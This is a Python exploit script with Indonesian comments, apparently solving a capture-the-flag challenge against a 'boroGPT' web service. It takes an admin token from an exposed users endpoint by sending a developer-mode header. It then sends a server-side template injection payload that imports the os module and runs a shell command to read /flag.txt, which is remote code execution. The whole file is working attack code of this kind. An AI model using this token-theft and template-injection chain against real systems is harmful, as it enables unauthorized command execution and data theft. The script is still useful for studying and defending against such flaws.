#!/usr/bin/env python3
import requests
import json

# Konfigurasi Target
BASE_URL = "https://mx7pk2qw9nr4slvt.boroctf.com"
ENDPOINT_USERS = f"{BASE_URL}/api/v0/users"
ENDPOINT_RENDER = f"{BASE_URL}/api/v0/render"

HEADERS = {
    "X-Dev-Mode": "true",
    "Content-Type": "application/json"
}

def main():
    print("[*] Memulai eksploitasi boroGPT...")
    
    # Langkah 1: Ambil sample_token admin dari endpoint users yang bocor
    print("[*] Menarik token debug admin dari database legacy...")
    try:
        res_users = requests.get(ENDPOINT_USERS, headers=HEADERS)
        if res_users.status_code != 200:
            print("[-] Gagal mengakses endpoint users. Periksa domain target.")
            return
        
        users_data = res_users.json()
        admin_token = None
        for user in users_data:
            if user.get("username") == "admin":
                admin_token = user.get("sample_token")
                break
                
        if not admin_token:
            print("[-] Token admin tidak ditemukan di dalam response JSON.")
            return
        print("[+] Token admin berhasil didapatkan.")
    except Exception as e:
        print(f"[-] Error saat mengambil token: {e}")
        return

    # Pasang token ke header Authorization
    HEADERS["Authorization"] = f"Bearer {admin_token}"

    # Langkah 2: Injeksi SSTI Payload untuk mengeksekusi perintah 'cat /flag.txt'
    print("[*] Mengirimkan payload SSTI -> RCE untuk membaca /flag.txt...")
    rce_payload = {
        "template": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"
    }

    try:
        res_render = requests.post(ENDPOINT_RENDER, headers=HEADERS, json=rce_payload)
        if res_render.status_code == 200:
            flag_output = res_render.json().get("output", "").strip()
            if flag_output:
                print("\n" + "="*50)
                print(f"[+++] FLAG BERHASIL DIDAPATKAN: {flag_output}")
                print("="*50 + "\n")
            else:
                print("[-] Server merespons 200 tetapi output kosong.")
        else:
            print(f"[-] Gagal mengeksekusi payload. Status code: {res_render.status_code}")
            print(res_render.text)
    except Exception as e:
        print(f"[-] Error saat mengeksekusi payload akhir: {e}")

if __name__ == "__main__":
    main()
